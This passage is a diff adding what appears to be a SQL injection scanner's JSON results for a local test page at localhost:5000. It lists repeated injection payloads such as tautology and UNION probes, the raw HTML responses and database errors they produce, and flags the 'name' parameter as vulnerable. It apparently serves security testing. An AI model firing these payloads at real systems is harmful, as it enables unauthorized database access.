@@ -1,0 +1,669 @@
+{
+    "URL": "http://localhost:5000/",
+    "Vulnerable": true,
+    "Payloads": [
+        {
+            "payload": "'",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#39;&#39;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "'",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#39;&#39;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' or \"",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; or &#34;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#34;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' UNION SELECT 1, @@version, 3--",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; UNION SELECT 1, @@version, 3--&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;@&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' #",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; #&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 'a'='a'##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;a&#39;=&#39;a&#39;##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1'## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' ##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; ##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' #",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; #&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1'## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "/*'*/",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;/*&#39;*/&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>near &#34;/&#34;: syntax error\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "'",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#39;&#39;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' or \"",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; or &#34;&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;&#34;&#39;&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' UNION SELECT 1, @@version, 3--",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; UNION SELECT 1, @@version, 3--&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;@&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1' #",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39; #&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 'a'='a'##",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;a&#39;=&#39;a&#39;##&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1#&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR 1=1## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR '1'='1'## -",
+            "response": {
+                "raw_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>SQL Injection Test</title>\n</head>\n<body>\n    <h1>Search Users</h1>\n    <form action=\"/\" method=\"get\">\n        <label for=\"name\">Name:</label>\n        <input type=\"text\" id=\"name\" name=\"name\">\n        <input type=\"submit\" value=\"Search\">\n    </form>\n\n    <div id=\"results\">\n        \n    </div>\n\n<!--    <div id=\"query\">-->\n<!--        -->\n<!--            Executed SQL Query: <br>SELECT * FROM users WHERE name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;## -&#39;-->\n<!--        -->\n<!--    </div>-->\n\n    <div id=\"error\">\n        \n            Database Error: <br>unrecognized token: &#34;#&#34;\n        \n    </div>\n</body>\n</html>"
+            },
+            "vulnerable_parameters": [
+                "name",
+                null
+            ],
+            "database_info": {},
+            "table_info": {},
+            "column_info": {},
+            "complete_dump": ""
+        },
+        {
+            "payload": "' OR 1=1#",
+            "response": {
